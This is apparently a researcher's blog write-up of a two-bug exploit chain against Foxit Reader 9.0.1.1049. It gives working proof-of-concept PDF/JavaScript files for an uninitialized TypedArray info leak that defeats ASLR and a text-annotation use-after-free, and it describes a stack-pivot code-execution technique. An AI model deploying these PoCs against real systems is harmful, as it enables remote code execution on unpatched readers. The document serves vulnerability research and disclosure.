<p class="cn">After discovering over 100 vulnerabilities in Foxit Reader, I figured it was about time I shared a full exploit chain that defeats ASLR and DEP. The first vulnerability is an uninitialized buffer that I found independently and was later killed by bit from meepwn. I leveraged this for an information leak to defeat ASLR. The second vulnerability is a use-after-free that I found, killed and leveraged for remote code execution.</p>

<p class="cn">TL;DR</p>

<p class="cn">I walk through exploiting a two different bugs chained together to achieve reliable code execution on a Windows 7 x86 desktop against Foxit Reader 9.0.1.1049.</p>

### Introduction

<p class="cn" markdown="1">Foxit Reader and PhantomPDF Reader are marketed as...</p>

> ...Fast, Affordable & Secure PDF Solutions

<p class="cn" markdown="1">However, as Adobe is aware, PDF parsing is a complex task and quite often error prone. Many vulnerabilities have been found inside of clientside PDF parsers and the fact that they need to support JavaScript creates an additional attack surface and greatly facilitates exploitation.</p>

### Foxit Reader Typed Array Uninitialized Pointer Information Disclosure Vulnerability

<p class="cn" markdown="1">
This vulnerability was assigned CVE-2018-9948 and published as [ZDI-18-332](https://www.zerodayinitiative.com/advisories/ZDI-18-332/) by the [ZDI](https://www.zerodayinitiative.com/). It was discovered by myself and bit from meepwn, however bit beat me too it reporting it to the ZDI. That, unfortunately, is how it rolls sometimes.</p>

<p class="cn" markdown="1">Let's take a look at some poc code. A minimised poc can be see below that will trigger the vulnerability:</p>

```JavaScript
%PDF 
1 0 obj
<</Pages 1 0 R /OpenAction 2 0 R>> 
2 0 obj
<</S /JavaScript /JS (

var int32View = new Int32Array(0x6c);
app.alert(util.printf("Uninitialized: 0x%04x", int32View[0]));

)>> trailer <</Root 1 0 R>>
```

<p class="cn" markdown="1">After enabling page heap, we can see we can read back the (in)famous 0xc0c0c0c0 magic marker of where uninitialized data is.</p>

            style="width:70%;height:70%" %}

<p class="cn" markdown="1">There are a couple of things to note about this vulnerability. The first thing is that this vulnerability cannot be discovered via traditional fuzzing, since the application will never crash. I built a windbg plugin to help detect these types of vulnerabilities called bridgit. Bridgit is a JavaScript bridge plugin for Foxit Reader that helps facilitate with vulnerability discovery and exploitation.</p>

<p class="cn" markdown="1">The other thing to note that all the TypedArray's are vulnerable with a single allocation (just like the advisory states). We can confirm this by using bridgit.</p>

<p class="cn" markdown="1">After trying different TypedArray's we can see that Int32Array and Float32Array are allocated from exactly the same positions, that is in **FoxitReader!CertFreeCertificateChain+0x013a2a32**. It's always good to confirm exactly what was patched!</p>

#### Exploitation

<p class="cn" markdown="1">An uninitialized TypedArray is a very powerful primitive, because we can specify the size of the buffer, thus, we can clobber almost any other buffer that we can allocate and free. For those that are unaware, typical exploitation of an uninitialized buffer can usually be achieved by allocating an object of _n_ size and then freeing that buffer before triggering the uninitialized buffer allocation. Where _n_ is the size of the uninitialized buffer (in our case, basically any size).</p>

<p class="cn" markdown="1">After some analysis, I found the perfect candidate and as it turns out, you can allocate an annotation object of size 0x5c, which, when freed is rounded to 0x60.</p>

```JavaScript
// allocates the annotation
var a = this.addAnnot({type: "Text"});

// free's the annotation
a.destroy();
```

<p class="cn" markdown="1">Now, we can combine this to leak the vtable of the text annotation.</p>

```JavaScript
%PDF 
1 0 obj
<</Pages 1 0 R /OpenAction 2 0 R>> 
2 0 obj
<</S /JavaScript /JS (

// allocates the annotation
var a = this.addAnnot({type: "Text"});

// free's the annotation
a.destroy();

// allocate the freed chunk
var test = new ArrayBuffer(0x60);
var int32View = new Int32Array(test);

// mask off the lower word
var leaked = int32View[0] & 0xffff0000;

// calculate an offset for version FoxitReader 9.0.1.1049
var foxit_base = leaked - 0x01f50000;
app.alert(util.printf("FoxitReader base address: 0x%08x", foxit_base));

)>> trailer <</Root 1 0 R>>
```

<p class="cn" markdown="1">After turning off page heap and firing the poc, we can see that we are leaking the base address of FoxitReader.exe:</p>

### Foxit Reader Text Annotations point Use-After-Free Remote Code Execution Vulnerability

<p class="cn" markdown="1">
This vulnerability was assigned CVE-2018-9958 and published as [ZDI-18-342](https://www.zerodayinitiative.com/advisories/ZDI-18-342/) by the [ZDI](https://www.zerodayinitiative.com/). It was discovered by yours trully.</p>

<p class="cn" markdown="1">Let's take a look at some poc code. A minimised poc can be see below that will trigger the vulnerability:</p>

```JavaScript
%PDF 
1 0 obj
<</Pages 1 0 R /OpenAction 2 0 R>> 
2 0 obj
<</S /JavaScript /JS (

// create an annotation
var a = this.addAnnot({type:"Text", page: 0, name:"uaf"});

// create an array with an element
var arr  = [1];

// make sure we can access the Document object
var that = this;

// setup the getter callback on element 0
Object.defineProperties(arr,{
    "0":{ 
        get: function () {

            // free the annotation
            that.getAnnot(0, "uaf").destroy();
            return 1; 
        }
    }
});

// trigger uaf
a.point = arr;

)>> trailer <</Root 1 0 R>>
```

<p class="cn" markdown="1">So when setting the point property of a text annotation that is created dynamically and we can trigger a JavaScript callback via a getter call on the first element in an array. In this getter, we can see that we destroy the created annotation, whilst setting a property on that annotation. This triggers the use-after-free and after running it with page heap enabled, we get the following crash:</p>

<p class="cn" markdown="1">This is classic use-after-free with no CFG protection vtable call, so all we really need to do it control the allocation. We already know that we can disclose memory locations.</p>

#### Exploitation

<p class="cn" markdown="1">We can disable page heap and set a breakpoint at the crash location to find the size of the freed object.</p>

<p class="cn" markdown="1">At this point (get it, point?) there was a few different ways we could chain the vulnerabilities. What we need to do now is get some data we control into memory at a known address. Traditionally, this is with a heap spray and a predictable address that we can spray at. However, after pondering a little more it occured to me that we can avoid a heap spray entirely.</p>

<p class="cn" markdown="1">What I had to do was leak a heap chunk pointer from the text annotation which was (ab)used for the uninitialized TypedArray. Then, reclaim that memory with a TypeArray, setting its contents to a stack pivot and setting the reclaimed object's fake vtable to this leaked address, thus avoiding a heap spray. Surprisingly, this worked with 100% success rate.</p>
<p class="cn" markdown="1">You can download the full exploit [here](/pocs/cve-2018-9958.pdf.txt). At the time, this was tested to work on both Windows 7 and 10. Of course, I also developed an additional poc with a heap spray just incase the heap chunk leak would fail. This one only works on Windows 7 though. </p>

<p class="cn" markdown="1">The final exploit just uses a _WinExec_ call and doesn't bother to modify memory, since ~~many third party malware protection tools look for memory modification techniques~~ I was lazy. I did see a _LoadLibraryW_ in FoxitReader's IAT, hint hint.</p>

<p class="cn" markdown="1">I didn't bother with continue of execution (CoE) since I don't work for an offense company anymore but all you would need to do is save the registers before the chain, return back to the stack after WinExec and restore the registers again, including the stack. FoxitReader.exe is 55MB in size, so finding ROP gadgets is a piece of cake for all of this. Anyway, on to the show!</p>

### Conclusion

<p class="cn">Foxit Reader still has relatively little protections against memory corruption vulnerabilities. The developers rely heavily on operating system mitigations. When you have a JavaScript attack surface, you best believe that operating system mitigations are not enough, application level mitigations such as CFG, isolated heap and a decent sandbox would have significantly impacted me in the development of this exploit.</p>

<p class="cn">TypeArray's are simply too powerful againt most software products and facilitated immensely in the final exploit. They were used for the information disclosure (both .data and .text addresses), the heap spray and the object replacement.</p>
